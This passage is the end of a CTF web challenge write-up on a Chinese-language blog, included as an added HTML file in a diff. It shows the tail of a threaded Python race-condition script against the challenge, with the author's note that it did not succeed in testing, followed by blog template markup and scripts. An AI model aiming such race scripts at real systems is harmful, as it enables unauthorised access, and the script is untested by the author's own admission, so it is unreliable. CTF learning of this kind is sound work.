class="hljs-string">&#x27;skysec&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finish&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        s = requests.Session()<br>        t1 = threading.Thread(target=func1, args=(s,))<br>        t2 = threading.Thread(target=func2, args=(s,))<br>        t1.start()<br>        t2.start()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></div></td></tr></table></figure>
+
+<p>注：但在后期测试中我没能成功，后面再研究一下，但我认为思路应该是正确的。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目可能因为一些失误有一些非预期，但是能进行这么多解法，对学习还是非常有帮助的。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BF%A1%E5%AE%89-CTF-Web/">信安 CTF Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>MyBlog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
